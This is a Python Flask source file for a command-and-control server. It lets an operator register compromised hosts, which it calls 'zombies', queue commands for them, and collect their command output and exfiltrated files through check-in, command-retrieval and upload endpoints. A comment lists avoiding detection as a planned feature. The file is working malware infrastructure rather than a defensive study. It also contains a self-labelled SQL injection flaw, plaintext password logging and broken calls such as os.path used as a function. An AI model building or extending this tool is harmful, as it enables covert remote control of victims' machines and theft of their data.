from database.database import Database
from flask import Flask, render_template, redirect, request, make_response, jsonify, send_from_directory, current_app
import base64
from server import ioFiles
# from os import path, environ, mkdir
import os 
import logging
from datetime import datetime

logger = logging.getLogger("server")
logging.basicConfig(level=logging.DEBUG, handlers=[
                        logging.FileHandler(f"c2_dev-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
                        logging.StreamHandler()
                    ], format="%(asctime)s |%(levelname)s| %(name)s->%(funcName)s => %(message)s    "
                    )
#print(f"[???] in server/flask.py, name is: {__name__}")


flask_log = logging.getLogger('werkzeug')
flask_log.setLevel(logging.ERROR)


class Server:
    app = Flask(__name__)

    #Should below also take a database object to manipulate on creation?
    def __init__(self):
        self.config_routes()
        logger.debug("routes configured")
        # Setup Flask App settings. 
        self.app.config['UPLOAD_FOLDER'] = 'files/post/'
        try:
            base_path = os.environ['base_path']
        except KeyError as e:
            logger.error("[-] Unable to find base_path variable, setting to defualt './'")
            base_path = './'
        # ROOT_PATH is for where the webserver templates live. 
        self.app.config['ROOT_PATH'] = base_path
        home = os.environ['HOME']
        # check if web-root exists

        # This is currenlty failing and causing server to not run
        if os.path(f'{home}/c2-base').exists():
            logger.debug(f"{home}/c2-base exists, setting this to ROOT_PATH")
            self.app.config['ROOT_PATH'] = f"{home}/c2-base"
        else:
            logger.debug(f"{home}/c2-base doesn't exists.")
            os.mkdir(f"{home}/c2-base")
            logger.debug("Created directory, now setting ROOT_PATH")
            self.app.config['ROOT_PATH'] = f"{home}/c2-base"

    def config_routes(self):
        """
            #TODO:

            # ADMIN PAGES
            - A page to view status of all known zombies -> DONE
            - A page to send instructions to zombies -> DONE
                - way to kill zombies if needed
            - A page to view output from zombies (files, screenshots, cmd output, etc)
            - login functionality -> DONE

            # ZOMBIE PAGES
            - landing page for checkins -> DONE
                - if instruction is available, redirect based on request types (download, run cmd, upload, etc)
            - A page to handles pulling data from zombie -> DONE
            - A page that handles pushing data to zombies -> DONE 
            - TO_ADD:
                - Some form of Zombie Auth.

        """

        ### ADMIN PAGES
        """
        - handle authentication via a form. If successful, writes session to database and sets a session cookie
            - can also determine if user has a current session via cookie
        """
        @self.app.route("/",methods=['GET','POST'])
        @self.app.route("/login", methods=['GET','POST'])
        def login():
            logger.debug(f"Recieved request to /login from {request.remote_addr}")
            if request.method == "GET":
                token = request.cookies.get('Session')
                if token is not None:
                    logger.debug("Found token, attempting to auth")
                    db = Database()
                    auth = db.is_authd(token)
                    logger.debug(f"auth is {auth}")
                    if auth:
                        resp = make_response(redirect("/admin/zombies",302))
                        return resp
                    else:
                        print(f"LOGIN => presented token: {token} wasn't found in DB!")
                        return render_template("login.html")
                else:
                    return render_template("login.html")
            elif request.method == "POST":
                #Needs input validation here to scrub user var for sqli
                user = request.form['username']
                db = Database()
                enc_pass = db.hash(request.form['password'])
                print(f"LOGIN => user:{user}\npassword:{request.form['password']}\nenc_pass:{enc_pass}")
                db_user = db.is_user(user)
                #print(db_user)
                if(db_user):
                    print(f"LOGIN => user:{user} was found!")
                    #check to see if enc_pass is same as admin pass
                    db_cred = db.get_enc_cred(user)
                    if db_cred is not None:
                        print(f"LOGIN => found db_cred:{db_cred}")
                        if enc_pass == db_cred:
                            #login successful
                            # - generate and save session token to db
                            # - Send token to client
                            # - redirect to dashboard
                            sesTok = db.get_token()
                            print(f"LOGIN => now saving session: {sesTok}")
                            res = db.create_session(user,sesTok)
                            resp = make_response(redirect("/admin/zombies",302))
                            resp.set_cookie('Session', sesTok)
                            return resp
                        else:
                            print(f"LOGIN => passwords didn't match whats in database!\npassword:{request.form['password']}\nenc:{enc_pass}")
                            resp = make_response(redirect("/login",302))
                            return resp
                    else:

                        #password wasn't found
                        #redirect back to login page
                        #may want to include logic for brute force protection
                        resp = make_response(redirect("/login",302))
                        return resp
                else:
                    print(f"LOGIN => user:{user} not found!")
                    resp = make_response(redirect("/login",302))
                    return resp
            else:
                resp = make_response(redirect("/login",302))
                return resp

        """
        - View all zombies. 
        """
        @self.app.route("/admin/zombies", methods=['GET'])
        def zombies():
            token = request.cookies.get('Session')
            if token is not None:
                db = Database()
                auth = db.is_authd(token)
                print(f"ZOMBIES => auth is {auth}")
                if auth:
                    #Get a list of all available agents:
                    zombies = db.get_zombies()
                    return render_template('agents.html', z=zombies)
                else:
                    print(f"ZOMBIES => presented token: {token} wasn't found in DB!")
                    return redirect("/login", 302)
            else:
                return redirect("/login", 302)

        """
        - Take a zombieID and save a dataBlob to data table for processing
            - will need a form to handle data input
        """
        @self.app.route("/admin/<zombieID>/", methods=['GET','POST'])
        def interact(zombieID):
            if request.method == 'GET':
                token = request.cookies.get('Session')
                if token is not None:
                    db = Database()
                    auth = db.is_authd(token)
                    tok_for_zombie = db.get_all_dataTok(zombieID)
                    zID = zombieID
                    print(f"[???] inTERACT => auth is {auth}")
                    if auth:
                        return render_template('execmd.html',d=tok_for_zombie,z=zID)
                    else:
                        print(f"[???] inTERACT => presented token: {token} wasn't found in DB!")
                        return redirect("/login", 302)
                else:
                    return redirect("/login", 302)
            elif request.method == 'POST':
                command = request.form['command']
                db = Database()
                db.add_command(command, zombieID)
                m = "Command Added!"
                return render_template("execmd.html",message=m,z=zombieID)
            else:
                print("INTERACT => wrong verb, redirecting")
                return redirect("/login", 302)
            
        """
         - Either present the text output of a command OR act as way to download files.
        """
        @self.app.route("/admin/<zombieID>/<token>",methods=['GET'])
        def zombieData(zombieID,token):
            if request.method == 'GET':
                auth_token = request.cookies.get('Session')
                if auth_token is not None:
                    db = Database()
                    auth = db.is_authd(auth_token)
                    print(f"ZOMBIEDATA => auth is {auth}")
                    if auth:
                        #Need to set up file or data and treat each differently
                        data = db.get_dataBlob(zombieID,token,"data")
                        print(f"ZOMBIEDATA => Found data:{data}")
                        if data == 'FILE':
                            #render_template with link to file
                            print(f"ZOMBIEDATA => FILE WAS FOUND: {token}")
                            cmd = "FILE"
                            #output = "LINK_TO_FILE"
                            return render_template('zombieData.html',c=cmd,token=token,z=zombieID)
                        else:
                            data = base64.b64decode(data.encode('utf-8')).decode('utf-8')
                            cmd = data.split("CMD:")[1]
                            cmd = cmd.split(":OUTPUT:")[0].strip()
                            print(f"ZOMBIEDATA => cmd: {cmd}")
                            output = data.split("CMD:")[1].split(":OUTPUT:")[1].strip()
                            output = output.split('\n')
                            print(f"ZOMBIEDATA => output: {output}")
                            return render_template('zombieData.html',c=cmd,o=output,z=zombieID)
                    else:
                        print(f"ZOMBIEDATA => presented token: {token} wasn't found in DB!")
                        return redirect("/login", 302)
                else:
                    return redirect("/login", 302)
            else:
                return redirect("/login", 302)

        """
        - Take a filename and serve it for download
        """
        @self.app.route('/downloads/<filename>', methods=['GET'])
        def download(filename):
            if request.method == 'GET':
                auth_token = request.cookies.get('Session')
                if auth_token is not None:
                    db = Database()
                    auth = db.is_authd(auth_token)
                    print(f"DOWNLOAD => auth is {auth}")
                    if auth:
                        uploads = path.join(self.app.config['ROOT_PATH'], self.app.config['UPLOAD_FOLDER'])
                        print(f"DOWNLOAD => UPLOADING FROM: {uploads}")
                        file = f"{filename}"
                        print(f"DOWNLOAD => file is {uploads}{file}")
                        return send_from_directory(uploads, file)
                    else:
                        print(f"DOWNLOADS => TOKEN: {auth_token} INVALID")
                        return redirect("/login", 302)
                else:
                    return redirect("/login", 302)
            else:
                return redirect("/login", 302)


        ### ZOMBIE PAGES
        """
        zombies will periodically check in here.
        upon request, page will:
            -load any instructions from database for that zombieID
            -depending on action, will redirect to apropriate page.
                - If command available, redirect to recvFrom and return token, sleepLength
                - If NO command available, return sleepLength.
        """
        @self.app.route("/checkin", methods=['POST'])                                  
        def checkin():
            content = request.get_json()
            zombieID = content['X-Client-ID']
            #print(f"CHECKIN => found zombieID: {zombieID}")
            # Static value to determine how long to sleep, need build a way to set dynamically
            sleepLength = 3
            db = Database()
            con = db.get_con(db.name)
            cur = db.get_cur(con)
            # check here if zombie has command available
            # First check if zombie exists
            if db.is_zombie(zombieID):
                print(f"CHECKIN => found zombieID: {zombieID}")
                # NEED TO UPDATE SQL STATEMENTS, THIS CODE IS VULNERABLE
                cmd = f"select zombieID, token from commands where zombieID='{zombieID}'"
                cur.execute(cmd)
                res = cur.fetchone()
                #print(f"CHECKIN => results found: {res}")
                con.close()
                if res is None:
                    print(f"CHECKIN => {zombieID}: No Commands available")
                    body = {"X-Server-Version":f"{sleepLength}"}
                    #resp = make_response("<body><p>OK</p></body>")
                    db.updateTime("zombies",zombieID)
                    return jsonify(body)
                else:
                    print(f"CHECKIN => {zombieID}: Command FOUND!")
                    token = res[1]
                    print(f"CHECKIN => Found token: {token}")
                    resp = make_response(redirect('/recvFrom',code=302))
                    resp.headers.add("Token",token)
                    resp.headers.add('X-Server-Version', sleepLength)
                    db.updateTime("zombies",zombieID)
                    return resp
            elif zombieID is not None:
                con.close()
                newHost = zombieID
                print(f"CHECKIN => now attempting to add host to database")
                if db.add_zombie(newHost):
                    print(f"CHECKIN => {newHost}: Added to db!")
                    body = {"X-Server-Version":f"{sleepLength}"}
                    return jsonify(body)
                else:
                    print(f"CHECKIN => {newHost}: ERROR, NOT ADDED")
                    body = {"ERROR":"NOT ADDED"}
                    return jsonify(body), 500     
            else:
                con.close()
                print(f"CHECKIN => Could not find zombieID: {zombieID} and 'X-Client-Version' is {request.cookie.get('X-Client-Version')}")
                con.close()
                return make_response("<h1>Info Not Found</h1>", 403)
            
        
        """
        - Recieve data from client and store in database
        - If 'file' command is recieved, server has zombie fetch file and recieves it whole
            or in chunks depending on file size. 
            - Server saves file or chunks to ./files/pre/zombieID
            - Server decodes file from ./files/pre and saves to ./files/post/zombieID-token
            - Server deletes file from ./files/pre/zombieID
            - Server sends command to get file
            - zombie grabs file, encodes, then sends in pages if too large.

        - Nice to have:
            - generate dynamic urls here to avoid detection
        """
        @self.app.route("/sendto", methods=['POST'])
        def sendto():
            content = request.get_json()
            data = content['data']
            zombieID = content['X-Client-ID']
            try:
                pageID = content['page']
            except:
                pageID = None
            #print(f"SENDTO => pageID: {pageID}")
            if pageID is not None:
                # handle files sent to server
                print(f"SENDTO => pageID:{pageID}")
                if pageID == 'END':
                    ioFile = ioFiles.ioFiles(zombieID)
                    if(ioFile.write_chunk(data)):
                        print("SENDTO => Last data has been written")
                    else:
                        print("SENDTO => ERROR WRITTING DATA")
                    body = {"X-Server-Version":"3"}
                    #add worker logic here
                    token = ioFile.process_file(zombieID)
                    print("SENDTO => Data Files have been processed")
                    #add database entry with zombieID and 'FILE' for blob
                    db = Database()
                    db.add_file(zombieID,token=token)
                    body = {"X-Server-Version":"3"}
                    return jsonify(body) 
                else:
                    print("SENDTO => SAVING CHUNK TO FILE")
                    ioFile = ioFiles.ioFiles(zombieID)
                    ioFile.write_chunk(data)
                    print("SENDTO => CHUNK SAVED")
                    body = {"X-Server-Version":"3"}
                    return jsonify(body)
            else:
                #no pages, just response data
                db = Database()
                db.add_data(data,zombieID)
                body = {"X-Server-Version":"3"}
                return jsonify(body)

            #return render_template("sendto.html",d=data,z=zombieID)

        """
         - Zombies come here to recieve commands
            - zombies present ID and token sent from server. 
         - Outputs an encoded command for zombie to run.
        """
        @self.app.route("/recvFrom")
        def recvFrom():
            db = Database()
            content = request.get_json()
            token = content['Token']
            zombieID = content['X-Client-ID']
            dataBlob = db.get_dataBlob(zombieID,token,"commands")
            if dataBlob is not None:
                body = {"data":f"{dataBlob}"}
                db.remove_tok(zombieID,token,"commands")
                return jsonify(body)
            else:
                body = {"ERROR":"YOU SHOULDN'T BE HERE"}
                return jsonify(body)
              
    def run(self):
        self.app.run(port=8080)
        # self.app.run(port=8080, debug=True)